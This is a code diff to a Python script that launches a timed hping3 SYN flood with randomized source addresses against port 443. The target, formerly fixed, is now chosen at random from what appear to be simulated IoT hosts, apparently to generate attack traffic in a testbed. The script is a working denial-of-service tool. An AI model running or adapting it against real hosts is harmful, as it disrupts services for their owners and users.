@@ -8,6 +8,9 @@ import signal
 import re
 import socket
 
+hosts = ["actor1_sim", "actor2_sim", "actor3_sim", "amazon_alexa_sim", "phillips_hue_sim", "somfy_sim"]
+host = random.choice(hosts)
+
 attack_time = random.randint(5, 10)  # duration of the attack in seconds
 
 subprocess.run("apk update && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hping3", shell=True)
@@ -16,12 +19,12 @@ print(f"Starting SYN flood attack for {attack_time} seconds...")
 
 start = time.time()
 
-result = socket.getaddrinfo("actor1_sim", None)
+result = socket.getaddrinfo(host, None)
 dst_ip = result[0][4][0]
 result = socket.getaddrinfo(socket.gethostname(), None)
 src_ip = result[0][4][0]
 
-proc = subprocess.Popen(f"hping3 -S actor1_sim -p 443 --flood --rand-source", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+proc = subprocess.Popen(f"hping3 -S {host} -p 443 --flood --rand-source", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 time.sleep(attack_time)
 
 proc.send_signal(signal.SIGINT) 
